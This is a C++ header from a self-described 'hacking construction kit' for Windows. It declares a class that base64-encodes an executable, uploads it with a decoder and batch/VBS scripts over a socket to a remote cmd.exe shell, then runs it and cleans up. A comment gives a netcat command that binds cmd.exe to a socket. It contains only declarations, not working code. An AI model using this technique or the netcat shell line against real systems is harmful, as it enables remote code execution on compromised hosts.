/*
 * Hacking construction kit -- A GPL Windows security library.
 * While this library can potentially be used for nefarious purposes, 
 * it was written for educational and recreational
 * purposes only and the author does not endorse illegal use.
 *
 * This library is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 *
 * You should have received a copy of the GNU General Public License
 * along with this library.  If not, see <http://www.gnu.org/licenses/>.
 *
 * Author: thirdstormofcythraul@outlook.com
 */
#pragma once

#include <winsock2.h>
#include <string>

// Upload and execute an exe file to an host
// This class encode the file in base64, send
// it to the host, decode the file and execute it.
// need a socket on target with a windows cmd.exe
// nc -l 127.0.0.1 -p 1234 -e cmd.exe
class UploadFileInBase64 {

public:
	// originalFile: path to local file
	// destinationFile: name of remote file
	UploadFileInBase64(const char *originalFile, const char *destinationFile);
	// Send file to this socket
	// socket: socket open on target
	bool upload(SOCKET socket);	

private:
	unsigned char *readFile(const char *path, size_t *size);

	bool writeFile(char *buffer, size_t length);

	bool decodeAndExecute(SOCKET socket);

	bool uploadB64File(SOCKET socket);

	bool cleanup(SOCKET socket);

	void readResponseFromSocket(SOCKET socket, bool print = true);

	bool uploadDecoder(SOCKET socket);

	bool uploadBatFile(SOCKET socket);

	bool executeBat(SOCKET socket);

	bool executeVbs(SOCKET socket);

	bool decodeFile(SOCKET socket);

	const char *original;
	const char *destination;
	std::string base64;
	std::string vbs;
	std::string bat;
	std::string dec;
	std::string exe;
	static const char *commands[51];
	static const char *decoder[197];

};

